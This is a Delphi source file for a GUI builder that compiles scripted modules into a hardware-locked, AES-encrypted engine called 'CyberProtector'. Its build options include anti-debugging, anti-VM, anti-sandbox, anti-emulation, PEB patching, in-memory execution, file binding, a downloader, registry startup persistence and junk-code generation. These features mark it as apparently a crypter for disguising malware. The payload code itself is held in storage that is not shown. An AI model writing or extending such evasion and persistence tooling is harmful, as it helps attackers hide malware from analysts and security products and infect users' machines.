unit U_Main;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, bsSkinCtrls, StdCtrls, Mask, bsSkinBoxCtrls, rsStorage,
  rsAesEncryptor, rsBinData, BusinessSkinForm, bsSkinData,
  PaxProgram, PaxCompiler,PaxInvoke,PaxRegister;

const
WM_RUN           = WM_USER + 1;

type
  TFrm_Main = class(TForm)
    SkinData: TbsSkinData;
    SkinStore: TbsCompressedStoredSkin;
    SkinForm: TbsBusinessSkinForm;
    BinData: TrsBinData;
    Encryptor: TrsAesEncryptor;
    storage: TrsStorage;
    ButtonGenerate: TbsSkinButton;
    Edit_UserID: TbsSkinEdit;
    bsSkinStdLabel1: TbsSkinStdLabel;
    hardwareid: TbsSkinEdit;
    bsSkinStdLabel2: TbsSkinStdLabel;
    procedure ButtonGenerateClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    procedure xRun(var Msg: TMessage); message WM_RUN;
  end;

var
  Frm_Main: TFrm_Main;

implementation

{$R *.dfm}
uses
U_Utils,dsrAES,U_Chiper;

type
  TBuild = class(TTHread)
  Private
    FHandle :THandle;
    FCode,FSave,FHardwareid :string;
  Public
    procedure Execute; override;
    constructor Create(Handle:THandle;Code,Save,Hardwareid: String);
    destructor Destroy; override;
  end;

function BufferToHex(const Buf; BufSize : Cardinal) : string;
var
  I     : LongInt;
begin
  Result := '';
  for I := 0 to BufSize - 1 do
    Result := Result + IntToHex(TByteArray(Buf)[I], 2);              {!!.01}
end;

function ReplaceText(const S,ReplacePiece,ReplaceWith: String):String;
Var
Position: Integer;
TempStr: String;
begin
Position := Pos(ReplacePiece,S);
if Position > 0 then Begin
TempStr := S;
Delete(TempStr,1,Position-1+Length(ReplacePiece));
Result :=
Copy(S,1,Position-1)+ReplaceWith+ReplaceText(TempStr,ReplacePiece,ReplaceWith)
End else Result := S;
end;


procedure SaveEngine(filename,key:string;Stream:TStream);
var
i : integer;
Data: TrsBinData;
cryptor: TrsAesEncryptor;
xstorage: TrsStorage;
KeyEnc : TKey128;
begin
  GenerateMD5KeyA(KeyEnc,ansistring(key));
  key := BufferToHex(KeyEnc,length(KeyEnc));
  if fileexists(filename) then deletefile(filename);
  Data := TrsBinData.Create(nil);
  cryptor:= TrsAesEncryptor.Create(nil);
  xstorage:= TrsStorage.Create(nil);
  try
    Data.FileName := filename;
    Data.Options := [];
    cryptor.KeyBits := ck256;
    cryptor.EncryptAll := true;
    cryptor.Key := key;
    xstorage.Encryptor := cryptor;
    xstorage.StorageData := Data;
    xstorage.WriteString('Application','CyberProtector');
    xstorage.WriteInteger('Version',1);
    xstorage.WriteInteger('MinSupport',1);
    xstorage.WriteStream('Engine',Stream);
    xstorage.WriteInteger('JunkCount',length(garbageasm));
    for i := 0 to length(garbageasm) -1 do
    begin
      xstorage.WriteString('JunkCode'+inttostr(i),string(garbageasm[i]));
    end;
    xstorage.WriteInteger('PatternCount',2);
    xstorage.WriteString('Pattern0hex','4812248F8EEFDB1229D978E88558251237889D509C5707B6F14AF9E17EB28DCF85E97F7610BAFE872C10A820421B4A8EE8BF96F50F78E965BBA9C576FACFB7E7');
    xstorage.WriteString('Pattern0Name','CGServer1');
    xstorage.WriteString('Pattern1hex','55D0B884B94000E81CA0FFFFEB0CBA84B9400033C0E84E93FFFF8D45C8E8AACEFFFF8D45C8508D45');
    xstorage.WriteString('Pattern1Name','CGServer2');
    xstorage.Save;
  finally
    xstorage.Free;
    Data.Free;
    cryptor.Free;
  end;
end;

constructor TBuild.Create(Handle:THandle;Code,Save,Hardwareid: String);
begin
  FCode := Code;
  FSave := Save;
  FHardwareid := Hardwareid;
  Fhandle := Handle;
  FreeOnTerminate := TRUE;
  inherited Create(True);
end;

destructor TBuild.Destroy;
begin
  inherited Destroy;
end;

procedure TBuild.Execute;
var
  I,H_TBuildInfo: Integer;
  PaxCompiler1: TPaxCompiler;
  PaxPascalLanguage1: TPaxPascalLanguage;
  PaxProgram1: TPaxProgram;
  EStream : TMemoryStream;
begin
  PaxCompiler1 := TPaxCompiler.Create(nil);
  PaxPascalLanguage1 := TPaxPascalLanguage.Create(nil);
  PaxProgram1 := TPaxProgram.Create(nil);
  try
    try
    PaxCompiler1.RegisterLanguage(PaxPascalLanguage1);
    PaxCompiler1.RegisterHeader(0, 'function ExIntToHex(Value: Integer; Digits: Integer): ansistring;', @ExIntToHex);
    PaxCompiler1.RegisterHeader(0, 'Function CrcansiString(source:ansistring):longword;', @CrcansiString);
    PaxCompiler1.RegisterHeader(0, 'Function GetString(str:ansistring):ansistring;', @GetString);
    PaxCompiler1.RegisterHeader(0, 'function JunkGenerator:Ansistring;', @JunkGenerator);
    PaxCompiler1.RegisterHeader(0, 'function GetName(str:ansistring):ansistring;', @GetName);
    PaxCompiler1.RegisterHeader(0, 'Function RandomFunc(const temp:array of string):string;', @RandomFunc);
    H_TBuildInfo := PaxCompiler1.RegisterRecordType(0, 'TBuildInfo');
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'projectname', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Debug', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'CompressMethod', _typeINTEGER);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'EncryptionMethod', _typeINTEGER);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiDebug', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiMonitor', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiSandbox', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiVM', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'AntiEmul', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'EncKey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Cryptdata', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'BufferMethod', _typeINTEGER);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'ResourceName', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Restype', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'ResSplit', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'ActiveFakeM', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'MessageType', _typeINTEGER);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'MessageText', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'MessageCaption', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'MessageButton', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'PatchPeb', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'usepath', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'havebrowser', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'havedrop', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'havebinder', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'havedownloader', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'haveStartup', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hklm', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hklmkey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hkcu', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hkcukey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Policies', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Policieskey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Activex', _typeBOOLEAN);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Activexkey', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'ComponentID', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'Vesion', _typeANSISTRING);
    PaxCompiler1.RegisterRecordTypeField(H_TBuildInfo, 'hardwareid', _typeCARDINAL);
    PaxCompiler1.AddModule('1', PaxPascalLanguage1.LanguageName);
    PaxCompiler1.AddCode('1',FCode);
    PaxCompiler1.AddCode('1','begin end.');
    if PaxCompiler1.Compile(PaxProgram1) then
    begin
      EStream := TMemoryStream.Create;
      try
        PaxProgram1.SaveToStream(EStream);
        EStream.Position := 0;
        SaveEngine(FSave+'.bin',FHardwareid,EStream);
      finally
        EStream.Free;
      end;
    end else
    begin
      for I:=0 to PaxCompiler1.ErrorCount - 1 do
      begin
        ShowMessage(format('Message %s, Line %s, Module %s, LineNumber %d, LinePos %d',[PaxCompiler1.ErrorMessage[i],PaxCompiler1.ErrorLine[i],
        PaxCompiler1.ErrorModuleName[i],PaxCompiler1.ErrorLineNumber[i],PaxCompiler1.ErrorLinePos[i]]));
      end;
    end;
    Except
    end;
  finally
    PaxCompiler1.Free;
    PaxPascalLanguage1.Free;
    PaxProgram1.Free;
  end;
  PostMessage(Fhandle, WM_RUN, 0, 0);
end;


procedure TFrm_Main.ButtonGenerateClick(Sender: TObject);
var
Build : TBuild;
needcode : tstringlist;
maincode : string;
begin
  needcode := tstringlist.Create;
  try
    storage.RootSection := 'GenerateName';
    needcode.Add(storage['Code']);
    storage.RootSection := 'Misc';
    needcode.Add(storage['Code']);
    storage.RootSection := 'GlobalVariable';
    needcode.Add(storage['Code']);
    storage.RootSection := 'ApiCall';
    needcode.Add(storage['Code']);
    storage.RootSection := 'Encryption';
    needcode.Add(storage['Code']);
    storage.RootSection := 'ExecuteFromMem';
    needcode.Add(storage['Code']);
    storage.RootSection := 'Antis';
    needcode.Add(storage['Code']);
    storage.RootSection := 'RunMain';
    needcode.Add(storage['Code']);
    storage.RootSection := 'Main';
    maincode := storage['Code'];
    maincode := ReplaceText(maincode,'xxxxxxxxxxxxxxxxxx',hardwareid.Text);
    needcode.Add(maincode);
    Build := TBuild.Create(Frm_Main.Handle,needcode.Text,Edit_UserID.Text,hardwareid.Text);
    Build.Resume;
  finally
    needcode.Free;
  end;
end;

procedure TFrm_Main.xRun(var Msg: TMessage);
begin
  showmessage('finish');
end;

end.
